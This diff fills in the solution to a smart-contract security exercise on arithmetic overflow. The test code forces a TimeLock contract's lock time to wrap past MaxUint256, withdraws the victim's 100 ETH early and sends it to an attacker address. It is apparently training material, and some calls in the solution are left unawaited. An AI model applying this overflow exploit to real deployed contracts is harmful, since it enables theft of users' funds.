@@ -12,6 +12,7 @@ describe("Arithmetic Over/Underflow Exercise 1", function () {
 
     const ONE_MONTH = 30 * 24 * 60 * 60;
     const VICTIM_DEPOSIT = parseEther("100");
+    const MAX_INT = ethers.constants.MaxUint256;
 
     let timelock: TimeLock;
     let attackerInitialBalance: BigNumber;
@@ -46,16 +47,25 @@ describe("Arithmetic Over/Underflow Exercise 1", function () {
 
         let victimDeposited = await timelock
             .connect(victim)
-            .getBalance(victim.address);
+            .balancesByWallet(victim.address);
         let lockTime = await timelock
             .connect(victim)
-            .getLockTime(victim.address);
+            .lockTimesByWallet(victim.address);
 
         expect(victimDeposited).to.equal(VICTIM_DEPOSIT);
     });
 
     it("Exploit", async function () {
         /** CODE YOUR SOLUTION HERE */
+        let overflowTime = MAX_INT.sub(await timelock.lockTimesByWallet(victim.address));
+        console.log("ADDRESS BEFORE OVERFLOW", await timelock.lockTimesByWallet(victim.address))
+        await timelock.connect(victim).increaseMyLockTime(overflowTime);
+        console.log("ADDRESS AFTER", await timelock.lockTimesByWallet(victim.address))
+        timelock.connect(victim).withdrawETH();
+        await victim.sendTransaction({
+            to: attacker.address,
+            value: victim.getBalance(),
+        });
     });
 
     after(async function () {
@@ -64,7 +74,7 @@ describe("Arithmetic Over/Underflow Exercise 1", function () {
         // Timelock contract victim's balance supposed to be 0 (withdrawn successfuly)
         let victimDepositedAfter = await timelock
             .connect(victim)
-            .getBalance(victim.address);
+            .balancesByWallet(victim.address);
         expect(victimDepositedAfter).to.equal(0);
 
         // Attacker's should steal successfully the 100 ETH (-0.2 ETH becuase TX fees)
